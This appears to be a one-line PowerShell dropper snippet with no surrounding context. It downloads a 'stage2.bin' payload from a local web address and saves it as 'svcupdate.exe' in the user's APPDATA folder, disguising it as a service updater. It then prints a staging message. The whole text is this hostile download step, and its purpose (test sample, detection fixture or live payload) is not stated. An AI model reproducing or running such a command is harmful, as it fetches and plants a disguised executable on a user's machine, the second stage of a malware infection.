
<# Remote fetch #> Start-BitsTransfer -Source "http://localhost:8080/cdn/stage2.bin" -Destination "$env:APPDATA\svcupdate.exe"; Write-Output "stage 17 initialized"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
